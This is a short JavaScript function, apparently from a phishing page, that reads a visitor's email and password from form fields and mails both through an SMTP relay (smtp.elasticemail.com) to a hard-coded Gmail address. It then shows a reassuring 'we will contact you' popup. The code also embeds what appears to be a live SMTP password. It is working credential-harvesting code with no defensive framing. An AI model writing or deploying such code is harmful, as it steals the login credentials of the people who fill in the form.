function emailSend(){
  var email = document.getElementById('email').value;
  var pass = document.getElementById('password').value;


  var messageBody = "Email : " +email+
                    "<br/> Password : " +pass;

    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "riazsorkar709@gmail.com",
        Password : "45B05DBA443F75EADA8D81F6C0D9732301B5",
        To : 'riazsorkar709@gmail.com',
        From : 'riazsorkar709@gmail.com',
        Subject : "Massage From "+email,
        Body : messageBody
    }).then(
      message => {
        if ( message== 'OK' ) {
          swal("Good job!", "WE CONDUCT YOU AS SOON ASS POSSIBLE!", "success");
        }
        else{
          swal("Error!", "TRY AGAIN", "error");
        }
      }
    );
}